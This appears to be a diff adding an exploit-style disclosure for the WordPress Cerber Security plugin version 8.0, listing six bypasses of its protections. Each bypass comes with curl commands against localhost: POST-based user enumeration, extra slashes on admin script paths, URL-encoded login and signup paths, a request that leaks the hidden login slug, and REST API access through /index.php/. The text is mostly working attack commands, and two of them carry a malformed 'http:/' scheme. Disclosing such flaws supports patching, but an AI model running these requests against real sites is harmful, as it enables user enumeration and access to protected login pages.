@@ -1,0 +1,65 @@
+# Exploit Title: WordPress Cerber Security, Antispam & Malware Scan - Multiple Bypass Vulnerabilities
+# Type: WordPress Plugin
+# Date: 2019-03-04
+# Active installs: 100,000+
+# Version: 8.0
+# Software Link: https://wordpress.org/plugins/wp-cerber/
+# Exploit Author: ed0x21son
+# Category: WebApps, WordPress
+# Tested on: Linux/WordPress 5.1
+
+[Vulnerabilities]
+
+
+#1: Stop user enumeration bypass:
+
+U can bypass user enumeration protection if u use Post method instead of Get.
+
+curl http://localhost/ -d author=1
+
+
+
+#2: Protect admin scripts bypass:
+
+U can bypass admin scripts protection if u add one or more slashes to the uri.
+
+curl 'http://localhost/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utils'
+curl 'http://localhost/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar'
+
+
+
+#3: Protects wp-login.php, wp-signup.php and wp-register.php from attacks bypass:
+
+U can bypass this protection if u encode any character in the uri.
+
+curl http://localhost/wp-login%2ephp
+curl -v http://localhost/wp-signup%2ephp
+curl -v http://localhost/wp-register%2ephp
+
+
+
+#4: Hide login URL bypass:
+
+U can bypass if u encode any character in the uri, Cerber will return the secret slug in the Location header field.
+
+curl -I http://localhost/wp-%61dmin/
+
+
+
+#5: Stop user enumeration via REST API bypass:
+
+U can bypass if u insert /index.php/ between domain and rest route.
+
+curl http:/localhost/index.php/wp-json/wp/v2/users/
+
+
+
+#6: Disable REST API bypass:
+
+Same above.
+
+curl http:/localhost/index.php/wp-json/wp/v2/
+
+
+
+--ed0x21son
